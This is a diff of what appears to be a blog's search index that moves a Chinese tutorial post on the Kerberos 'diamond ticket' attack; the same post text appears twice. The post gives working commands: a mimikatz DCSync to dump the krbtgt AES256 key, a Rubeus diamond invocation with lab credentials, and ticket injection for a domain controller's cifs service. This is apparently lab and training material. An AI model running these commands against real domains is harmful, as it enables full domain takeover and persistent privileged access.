@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>钻石票据 DiamondTicket</title>
+    <link href="/2025/01/23/DiamondTicket/"/>
+    <url>/2025/01/23/DiamondTicket/</url>
+    
+    <content type="html"><![CDATA[<h1 id="钻石票据-DiamondTicket"><a href="#钻石票据-DiamondTicket" class="headerlink" title="钻石票据 DiamondTicket"></a>钻石票据 DiamondTicket</h1><p>黄金票据攻击和钻石票据攻击都需要访问<code>krbtgt</code>密钥。然而，钻石票据攻击需要访问<code>AES256</code>密钥。黄金票证攻击则是利用伪造票证授予票证 (TGT) ，而钻石票证攻击则利用了域控制器 (DC) 请求的真实 TGT 进行解密和重新加密进行票据攻击<br>黄金票据充分利用了能够从头开始伪造票据授予票据 (TGT) 的优势，而钻石票据则利用了能够解密和重新加密从域控制器 (DC) 请求的真实 TGT 的优势</p><h2 id="钻石PAC"><a href="#钻石PAC" class="headerlink" title="钻石PAC"></a>钻石PAC</h2><p>PAC 是一种传递域控制器 (DC)提供的授权相关信息的结构。身份验证协议使用 PAC 来验证身份以传输授权信息，从而控制对资源的访问。说白了就是来验证身份是否有效的。<br>最初的<code>钻石PAC</code>攻击远没有钻石票据灵活，攻击成功需要两个条件:</p><ol><li>在没有特权属性证书（PAC）的情况下请求TGT</li><li>确保要访问的服务的服务帐户未在其 UserAccountControl (UAC) 属性中设置“NA”位</li></ol><p>在服务帐户的 UAC 属性中设置 NA 位后，向该服务帐户请求的 ST 没有 PAC ，攻击者下一个阶段就可以构造恶意 PAC 注入到 ST 中实现攻击<br>由于2021年发布的补丁无法再在完全最新的域控制器 (DC) 上使用没有 PAC 的 TGT。我们知道需要拥有<code>KRBTGT</code>密钥，并且攻击利用任何其他有效帐户来请求 TGT。所以我们想为什么不直接解密该 TGT，按照我们想要的方式修改它，重新计算 PAC 签名，然后重新加密它。这就是我们所说的钻石票据</p><h2 id="钻石票据攻击利用"><a href="#钻石票据攻击利用" class="headerlink" title="钻石票据攻击利用"></a>钻石票据攻击利用</h2><p>清除已有票据以免造成影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">klist purge<br></code></pre></td></tr></table></figure><p>使用钻石票据的思路就是使用低权限的用户向域控请求一个普通的 <code>TGT</code>，随后进行解密修改签名和重新加密即可，当然这些事情<code>Rubeus</code>会自动帮我们完成，我们只需要提供信息即可</p><p>使用 <code>mimikatz</code> 抓取 <code>krbtgt</code> 用户 <code>aes256</code>密钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::dcsync /domain:rootkit.org /user:krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p>使用钻石票据需要提供以下信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">krbkey:<span class="hljs-number">4685250</span>f2ee69857f5f2f5098dbfbc4e2bfd539be23329d55c4377ca4108390f<br>user:Test2  <span class="hljs-comment">//低权限用户</span><br>password:Seven@Six999. <span class="hljs-comment">//用户密码</span><br>domain:world.org<br>dc:DC3.world.org<br>ticketuser:test123 <span class="hljs-comment">//伪造的票据用户名可以任意，不需要域中存在该用户</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Rubeus.exe diamond /krbkey:<span class="hljs-number">3e65833</span>fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /password:Admin12345 /enctype:aes /domain:rootkit.org /dc:owa2013.rootkit.org /ticketuser:test123 /ptt /nowrap<br></code></pre></td></tr></table></figure><p>下图为原<code>TGT</code></p><p><img src="/img/zuanshi1.png" alt="image-20241012235634790"></p><p>下图为解密重新构造的<code>TGT</code></p><p><img src="/img/zuanshi2.png" alt="image-20241012235735270"></p><p>利用我们重新构造的<code>TGT</code>对域控的<code>cifs</code>服务进行票据注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Rubeus.exe asktgs /ticket:doIFDjCCBQqgAwIBBaEDAgEWooIEHTCCBBlhggQVMIIEEaADAgEFoQsbCVdPUkxELkNPTaIeMBygAwIBAqEVMBMbBmtyYnRndBsJV09STEQuQ09No4ID2zCCA9egAwIBEqEDAgEDooIDyQSCA8VesXv9u+qfJj1eXxFcL8ueDSKZcdDk0+zyU3foDvs+<span class="hljs-number">1</span>Nh9ynLlDVJiVpRc4MAArcSvkVOtF3WSjIwc10++BApjlVuLBww9JYiFK3u9Um9MOAJ9pLIgarCQVfczqJ6i3kL/PZnIaavjS4b9AVXxt+X+mu/PYFgpZe2BL9cSQGA8xbHHsLO7PUjootdH6vQYRMlBaojjCMUWTPy9bCenVo0Txx/J18DbFb3E2huoyRd9d+fRx97R0/<span class="hljs-number">5</span>NGsSL0NTSoJPLIFeYAAYrc+EJYModcZElXQu+zq78a8xyeKDMG1EfSQiyP3HtDOYOezu5H0O1arH169ijEsW02Y3rGiBgwpBSpIwoInvum1LpCpvda+yjKSbJotdrnrmIgBjHQMFhloI21c4vQDvlpBrShSK2O6r4iGsxE0NDJQvw/<span class="hljs-number">4</span>bZNWqtzrLA8QpkyfAQkG2nsT2ic+unLTVJutGhCkye0UPYzIYfIKkEymkkcSAJNC6qyyeG2f4Tv+<span class="hljs-number">1</span>unyQWxiulWfbrOgeOIfrnziRV/QBCvhBLr+z6O/rBDcNBdvEV32E4I6LS5nXt7O5cUl1rk8/ANg0D+v4DMkazEGtms+d7bUul5/OBNE2Gw18/Pknrc22Xp6OCLHNOZu3+io4MHxxsdMMTiszg2vinw4DgGdIilrsD84LsucbJpiTURN5BQI9HH0H95mxTVudOLEnit6f9EA0I21pGYNvbBlCMnmKCKMZF7KUszowuC2x3Nf2llnMVP7YEEb2rsVilJ9r7qgvAfTLH2R5Tz8Y4x8k0Hjidk0oMBV7RlTr5blKvQZ23PDYpsb1gM0nxW49BGcRNqFkB9VbN+VZ5dz/DPKrWlXIcisldI5HpoamRiURAOlxoPCKUnhj8Y5NrpRY7O/NRNyZCA6PzTTfw6y8la8m0Im5x88Uh6XOhGIsV43DfdUT/usIzp2QE8fblllSKDhRZAE1ZGXvJ9JGadTUkn+R8sWDmzwZ3qu+VDi64nc4AexYZIGwK6mkHKQzNHbw4CjdAL8RuzdaySIx/k5GhyI1V4TCYGGTnsrZmHSYwTqD4K3jHWDjqSva2cK9fb3tQ9f5PFIGQUldChv/k97yIQB1EKHo8anqyvzvzrvoYpJ7IrFrCtafSV7DeWvv9xJaFYchERDFpt7OcLoWWO77Ru1j6DhD+SqOPJELK1bMOcDxplRz6KlbrnLUKvQxQT07A4KV46fgaREwFcULXI6yw86qlNEIxAQR8XoNtb1uwY1r4MrQBTWTRTyOFELPSDLX03HHowQxYfQQnj4oxuJqLQKOB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgESoSIEIFqAkXnHL2+iV2NMXaKCUsSa92xqmIZdHMTFDpGeUcNXoQsbCVdPUkxELkNPTaIUMBKgAwIBAaELMAkbB3Rlc3QxMjOjBwMFAEDhAAClERgPMjAyNDEwMTIxNTQxMDdaphEYDzIwMjQxMDEzMDE0MTA3WqcRGA8yMDI0MTAxOTE1NDEwN1qoCxsJV09STEQuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlXT1JMRC5DT00= /service:cifs/DC3.world.com /ptt /nowrap<br></code></pre></td></tr></table></figure><p>下图可见票据已生成并可以成功利用</p><p><img src="/img/zuanshi3.png" alt="image-20241012235955902"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>域渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>票据伪造</tag>
+      
+      <tag>权限维持</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>非约束委派和约束委派</title>
     <link href="/2025/01/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
     <url>/2025/01/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
@@ -25,33 +52,6 @@
       <tag>渗透</tag>
       
       <tag>委派攻击</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>钻石票据 DiamondTicket</title>
-    <link href="/2025/01/23/DiamondTicket/"/>
-    <url>/2025/01/23/DiamondTicket/</url>
-    
-    <content type="html"><![CDATA[<h1 id="钻石票据-DiamondTicket"><a href="#钻石票据-DiamondTicket" class="headerlink" title="钻石票据 DiamondTicket"></a>钻石票据 DiamondTicket</h1><p>黄金票据攻击和钻石票据攻击都需要访问<code>krbtgt</code>密钥。然而，钻石票据攻击需要访问<code>AES256</code>密钥。黄金票证攻击则是利用伪造票证授予票证 (TGT) ，而钻石票证攻击则利用了域控制器 (DC) 请求的真实 TGT 进行解密和重新加密进行票据攻击<br>黄金票据充分利用了能够从头开始伪造票据授予票据 (TGT) 的优势，而钻石票据则利用了能够解密和重新加密从域控制器 (DC) 请求的真实 TGT 的优势</p><h2 id="钻石PAC"><a href="#钻石PAC" class="headerlink" title="钻石PAC"></a>钻石PAC</h2><p>PAC 是一种传递域控制器 (DC)提供的授权相关信息的结构。身份验证协议使用 PAC 来验证身份以传输授权信息，从而控制对资源的访问。说白了就是来验证身份是否有效的。<br>最初的<code>钻石PAC</code>攻击远没有钻石票据灵活，攻击成功需要两个条件:</p><ol><li>在没有特权属性证书（PAC）的情况下请求TGT</li><li>确保要访问的服务的服务帐户未在其 UserAccountControl (UAC) 属性中设置“NA”位</li></ol><p>在服务帐户的 UAC 属性中设置 NA 位后，向该服务帐户请求的 ST 没有 PAC ，攻击者下一个阶段就可以构造恶意 PAC 注入到 ST 中实现攻击<br>由于2021年发布的补丁无法再在完全最新的域控制器 (DC) 上使用没有 PAC 的 TGT。我们知道需要拥有<code>KRBTGT</code>密钥，并且攻击利用任何其他有效帐户来请求 TGT。所以我们想为什么不直接解密该 TGT，按照我们想要的方式修改它，重新计算 PAC 签名，然后重新加密它。这就是我们所说的钻石票据</p><h2 id="钻石票据攻击利用"><a href="#钻石票据攻击利用" class="headerlink" title="钻石票据攻击利用"></a>钻石票据攻击利用</h2><p>清除已有票据以免造成影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">klist purge<br></code></pre></td></tr></table></figure><p>使用钻石票据的思路就是使用低权限的用户向域控请求一个普通的 <code>TGT</code>，随后进行解密修改签名和重新加密即可，当然这些事情<code>Rubeus</code>会自动帮我们完成，我们只需要提供信息即可</p><p>使用 <code>mimikatz</code> 抓取 <code>krbtgt</code> 用户 <code>aes256</code>密钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::dcsync /domain:rootkit.org /user:krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p>使用钻石票据需要提供以下信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">krbkey:<span class="hljs-number">4685250</span>f2ee69857f5f2f5098dbfbc4e2bfd539be23329d55c4377ca4108390f<br>user:Test2  <span class="hljs-comment">//低权限用户</span><br>password:Seven@Six999. <span class="hljs-comment">//用户密码</span><br>domain:world.org<br>dc:DC3.world.org<br>ticketuser:test123 <span class="hljs-comment">//伪造的票据用户名可以任意，不需要域中存在该用户</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Rubeus.exe diamond /krbkey:<span class="hljs-number">3e65833</span>fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /password:Admin12345 /enctype:aes /domain:rootkit.org /dc:owa2013.rootkit.org /ticketuser:test123 /ptt /nowrap<br></code></pre></td></tr></table></figure><p>下图为原<code>TGT</code></p><p><img src="/img/zuanshi1.png" alt="image-20241012235634790"></p><p>下图为解密重新构造的<code>TGT</code></p><p><img src="/img/zuanshi2.png" alt="image-20241012235735270"></p><p>利用我们重新构造的<code>TGT</code>对域控的<code>cifs</code>服务进行票据注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Rubeus.exe asktgs /ticket:doIFDjCCBQqgAwIBBaEDAgEWooIEHTCCBBlhggQVMIIEEaADAgEFoQsbCVdPUkxELkNPTaIeMBygAwIBAqEVMBMbBmtyYnRndBsJV09STEQuQ09No4ID2zCCA9egAwIBEqEDAgEDooIDyQSCA8VesXv9u+qfJj1eXxFcL8ueDSKZcdDk0+zyU3foDvs+<span class="hljs-number">1</span>Nh9ynLlDVJiVpRc4MAArcSvkVOtF3WSjIwc10++BApjlVuLBww9JYiFK3u9Um9MOAJ9pLIgarCQVfczqJ6i3kL/PZnIaavjS4b9AVXxt+X+mu/PYFgpZe2BL9cSQGA8xbHHsLO7PUjootdH6vQYRMlBaojjCMUWTPy9bCenVo0Txx/J18DbFb3E2huoyRd9d+fRx97R0/<span class="hljs-number">5</span>NGsSL0NTSoJPLIFeYAAYrc+EJYModcZElXQu+zq78a8xyeKDMG1EfSQiyP3HtDOYOezu5H0O1arH169ijEsW02Y3rGiBgwpBSpIwoInvum1LpCpvda+yjKSbJotdrnrmIgBjHQMFhloI21c4vQDvlpBrShSK2O6r4iGsxE0NDJQvw/<span class="hljs-number">4</span>bZNWqtzrLA8QpkyfAQkG2nsT2ic+unLTVJutGhCkye0UPYzIYfIKkEymkkcSAJNC6qyyeG2f4Tv+<span class="hljs-number">1</span>unyQWxiulWfbrOgeOIfrnziRV/QBCvhBLr+z6O/rBDcNBdvEV32E4I6LS5nXt7O5cUl1rk8/ANg0D+v4DMkazEGtms+d7bUul5/OBNE2Gw18/Pknrc22Xp6OCLHNOZu3+io4MHxxsdMMTiszg2vinw4DgGdIilrsD84LsucbJpiTURN5BQI9HH0H95mxTVudOLEnit6f9EA0I21pGYNvbBlCMnmKCKMZF7KUszowuC2x3Nf2llnMVP7YEEb2rsVilJ9r7qgvAfTLH2R5Tz8Y4x8k0Hjidk0oMBV7RlTr5blKvQZ23PDYpsb1gM0nxW49BGcRNqFkB9VbN+VZ5dz/DPKrWlXIcisldI5HpoamRiURAOlxoPCKUnhj8Y5NrpRY7O/NRNyZCA6PzTTfw6y8la8m0Im5x88Uh6XOhGIsV43DfdUT/usIzp2QE8fblllSKDhRZAE1ZGXvJ9JGadTUkn+R8sWDmzwZ3qu+VDi64nc4AexYZIGwK6mkHKQzNHbw4CjdAL8RuzdaySIx/k5GhyI1V4TCYGGTnsrZmHSYwTqD4K3jHWDjqSva2cK9fb3tQ9f5PFIGQUldChv/k97yIQB1EKHo8anqyvzvzrvoYpJ7IrFrCtafSV7DeWvv9xJaFYchERDFpt7OcLoWWO77Ru1j6DhD+SqOPJELK1bMOcDxplRz6KlbrnLUKvQxQT07A4KV46fgaREwFcULXI6yw86qlNEIxAQR8XoNtb1uwY1r4MrQBTWTRTyOFELPSDLX03HHowQxYfQQnj4oxuJqLQKOB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgESoSIEIFqAkXnHL2+iV2NMXaKCUsSa92xqmIZdHMTFDpGeUcNXoQsbCVdPUkxELkNPTaIUMBKgAwIBAaELMAkbB3Rlc3QxMjOjBwMFAEDhAAClERgPMjAyNDEwMTIxNTQxMDdaphEYDzIwMjQxMDEzMDE0MTA3WqcRGA8yMDI0MTAxOTE1NDEwN1qoCxsJV09STEQuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlXT1JMRC5DT00= /service:cifs/DC3.world.com /ptt /nowrap<br></code></pre></td></tr></table></figure><p>下图可见票据已生成并可以成功利用</p><p><img src="/img/zuanshi3.png" alt="image-20241012235955902"></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>域渗透</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>票据伪造</tag>
-      
-      <tag>权限维持</tag>
       
     </tags>
     
